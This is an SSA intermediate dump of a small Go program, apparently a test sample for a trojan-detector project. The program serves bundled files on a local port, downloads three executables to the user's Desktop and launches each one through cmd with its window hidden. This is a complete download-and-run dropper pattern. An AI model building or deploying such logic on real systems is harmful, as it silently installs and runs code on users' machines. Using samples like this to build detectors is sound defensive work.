# Name: command-line-arguments.init
# Package: command-line-arguments
# Synthetic: package initializer
func init():
0:                                                                entry P:0 S:2
	t0 = *init$guard                                                   bool
	if t0 goto 2 else 1
1:                                                           init.start P:1 S:1
	*init$guard = true:bool
	t1 = net/http.init()                                                 ()
	t2 = github.com/gobuffalo/packr/v2.init()                            ()
	t3 = io.init()                                                       ()
	t4 = os.init()                                                       ()
	t5 = os/exec.init()                                                  ()
	t6 = fmt.init()                                                      ()
	t7 = log.init()                                                      ()
	t8 = syscall.init()                                                  ()
	t9 = os/user.init()                                                  ()
	jump 2
2:                                                            init.done P:2 S:0
	return

# Name: command-line-arguments.main
# Package: command-line-arguments
# Location: E:\Trojan Detector\Trojan-Detector\src\Golang\test2\try.go:15:6
func main():
0:                                                                entry P:0 S:2
	go serveFiles()
	t0 = make map[string]string 3:int                     map[string]string
	t0["e.exe":string] = "http://127.0.0.1:...":string
	t0["o.exe":string] = "http://127.0.0.1:...":string
	t0["s.exe":string] = "http://127.0.0.1:...":string
	t1 = os/user.Current()                           (*os/user.User, error)
	t2 = extract t1 #0                                        *os/user.User
	t3 = extract t1 #1                                                error
	t4 = t3 != nil:error                                               bool
	if t4 goto 1 else 2
1:                                                              if.then P:1 S:1
	t5 = new [1]any (varargs)                                       *[1]any
	t6 = &t5[0:int]                                                    *any
	t7 = change interface any <- error (t3)                             any
	*t6 = t7
	t8 = slice t5[:]                                                  []any
	t9 = log.Fatal(t8...)                                                ()
	jump 2
2:                                                              if.done P:2 S:1
	t10 = &t2.HomeDir [#4]                                          *string
	t11 = *t10                                                       string
	t12 = new [2]any (varargs)                                      *[2]any
	t13 = &t12[0:int]                                                  *any
	t14 = make any <- string ("User Home Directory:":string)            any
	*t13 = t14
	t15 = &t12[1:int]                                                  *any
	t16 = make any <- string (t11)                                      any
	*t15 = t16
	t17 = slice t12[:]                                                []any
	t18 = fmt.Println(t17...)                            (n int, err error)
	t19 = &t2.HomeDir [#4]                                          *string
	t20 = *t19                                                       string
	t21 = t20 + "\\Desktop\\":string                                 string
	t22 = range t0                                                     iter
	jump 3
3:                                                       rangeiter.loop P:3 S:2
	t23 = next t22                            (ok bool, k string, v string)
	t24 = extract t23 #0                                               bool
	if t24 goto 4 else 5
4:                                                       rangeiter.body P:1 S:2
	t25 = extract t23 #1                                             string
	t26 = extract t23 #2                                             string
	t27 = t21 + t25                                                  string
	t28 = downloadFile(t27, t26)                                      error
	t29 = t28 != nil:error                                             bool
	if t29 goto 6 else 3
5:                                                       rangeiter.done P:1 S:1
	t30 = range t0                                                     iter
	jump 7
6:                                                              if.then P:1 S:1
	t31 = new [4]any (varargs)                                      *[4]any
	t32 = &t31[0:int]                                                  *any
	t33 = make any <- string ("Error downloading":string)               any
	*t32 = t33
	t34 = &t31[1:int]                                                  *any
	t35 = make any <- string (t25)                                      any
	*t34 = t35
	t36 = &t31[2:int]                                                  *any
	t37 = make any <- string (":":string)                               any
	*t36 = t37
	t38 = &t31[3:int]                                                  *any
	t39 = change interface any <- error (t28)                           any
	*t38 = t39
	t40 = slice t31[:]                                                []any
	t41 = log.Println(t40...)                                            ()
	jump 3
7:                                                       rangeiter.loop P:3 S:2
	t42 = next t30                      (ok bool, k string, v invalid type)
	t43 = extract t42 #0                                               bool
	if t43 goto 8 else 9
8:                                                       rangeiter.body P:1 S:2
	t44 = extract t42 #1                                             string
	t45 = t21 + t44                                                  string
	t46 = executeFile(t45)                                            error
	t47 = t46 != nil:error                                             bool
	if t47 goto 10 else 7
9:                                                       rangeiter.done P:1 S:0
	return
10:                                                             if.then P:1 S:1
	t48 = new [4]any (varargs)                                      *[4]any
	t49 = &t48[0:int]                                                  *any
	t50 = make any <- string ("Error executing":string)                 any
	*t49 = t50
	t51 = &t48[1:int]                                                  *any
	t52 = make any <- string (t44)                                      any
	*t51 = t52
	t53 = &t48[2:int]                                                  *any
	t54 = make any <- string (":":string)                               any
	*t53 = t54
	t55 = &t48[3:int]                                                  *any
	t56 = change interface any <- error (t46)                           any
	*t55 = t56
	t57 = slice t48[:]                                                []any
	t58 = log.Println(t57...)                                            ()
	jump 7

# Name: command-line-arguments.serveFiles
# Package: command-line-arguments
# Location: E:\Trojan Detector\Trojan-Detector\src\Golang\test2\try.go:49:6
func serveFiles():
0:                                                                entry P:0 S:2
	t0 = github.com/gobuffalo/packr/v2.New("filesBox":string, "./bin":string) *github.com/gobuffalo/packr/v2.Box
	t1 = make net/http.FileSystem <- *github.com/gobuffalo/packr/v2.Box (t0) net/http.FileSystem
	t2 = net/http.FileServer(t1)                           net/http.Handler
	t3 = net/http.Handle("/":string, t2)                                 ()
	t4 = net/http.ListenAndServe(":3001":string, nil:net/http.Handler) error
	t5 = t4 != nil:error                                               bool
	if t5 goto 1 else 2
1:                                                              if.then P:1 S:1
	t6 = new [1]any (varargs)                                       *[1]any
	t7 = &t6[0:int]                                                    *any
	t8 = change interface any <- error (t4)                             any
	*t7 = t8
	t9 = slice t6[:]                                                  []any
	t10 = log.Fatal(t9...)                                               ()
	jump 2
2:                                                              if.done P:2 S:0
	return

# Name: command-line-arguments.downloadFile
# Package: command-line-arguments
# Location: E:\Trojan Detector\Trojan-Detector\src\Golang\test2\try.go:57:6
# Recover: 3
# Locals:
#   0:	t0 error
func downloadFile(filepath string, url string) error:
0:                                                                entry P:0 S:2
	t0 = local error ()                                              *error
	t1 = os.Create(filepath)                              (*os.File, error)
	t2 = extract t1 #0                                             *os.File
	t3 = extract t1 #1                                                error
	t4 = t3 != nil:error                                               bool
	if t4 goto 1 else 2
1:                                                              if.then P:1 S:0
	*t0 = t3
	rundefers
	t5 = *t0                                                          error
	return t5
2:                                                              if.done P:1 S:2
	defer (*os.File).Close(t2)
	t6 = net/http.Get(url)             (resp *net/http.Response, err error)
	t7 = extract t6 #0                                   *net/http.Response
	t8 = extract t6 #1                                                error
	t9 = t8 != nil:error                                               bool
	if t9 goto 4 else 5
3:                                                              recover P:0 S:0
	t10 = *t0                                                         error
	return t10
4:                                                              if.then P:1 S:0
	*t0 = t8
	rundefers
	t11 = *t0                                                         error
	return t11
5:                                                              if.done P:1 S:2
	t12 = &t7.Body [#6]                                      *io.ReadCloser
	t13 = *t12                                                io.ReadCloser
	defer invoke t13.Close()
	t14 = &t7.Body [#6]                                      *io.ReadCloser
	t15 = *t14                                                io.ReadCloser
	t16 = make io.Writer <- *os.File (t2)                         io.Writer
	t17 = change interface io.Reader <- io.ReadCloser (t15)       io.Reader
	t18 = io.Copy(t16, t17)                      (written int64, err error)
	t19 = extract t18 #0                                              int64
	t20 = extract t18 #1                                              error
	t21 = t20 != nil:error                                             bool
	if t21 goto 6 else 7
6:                                                              if.then P:1 S:0
	*t0 = t20
	rundefers
	t22 = *t0                                                         error
	return t22
7:                                                              if.done P:1 S:0
	t23 = new [2]any (varargs)                                      *[2]any
	t24 = &t23[0:int]                                                  *any
	t25 = make any <- string ("Downloaded file:":string)                any
	*t24 = t25
	t26 = &t23[1:int]                                                  *any
	t27 = make any <- string (filepath)                                 any
	*t26 = t27
	t28 = slice t23[:]                                                []any
	t29 = fmt.Println(t28...)                            (n int, err error)
	*t0 = nil:error
	rundefers
	t30 = *t0                                                         error
	return t30

# Name: command-line-arguments.executeFile
# Package: command-line-arguments
# Location: E:\Trojan Detector\Trojan-Detector\src\Golang\test2\try.go:78:6
func executeFile(filepath string) error:
0:                                                                entry P:0 S:0
	t0 = new [2]string (varargs)                                 *[2]string
	t1 = &t0[0:int]                                                 *string
	*t1 = "/C":string
	t2 = &t0[1:int]                                                 *string
	*t2 = filepath
	t3 = slice t0[:]                                               []string
	t4 = os/exec.Command("cmd":string, t3...)                  *os/exec.Cmd
	t5 = new syscall.SysProcAttr (complit)             *syscall.SysProcAttr
	t6 = &t5.HideWindow [#0]                                          *bool
	*t6 = true:bool
	t7 = &t4.SysProcAttr [#8]                         **syscall.SysProcAttr
	*t7 = t5
	t8 = (*os/exec.Cmd).Start(t4)                                     error
	return t8

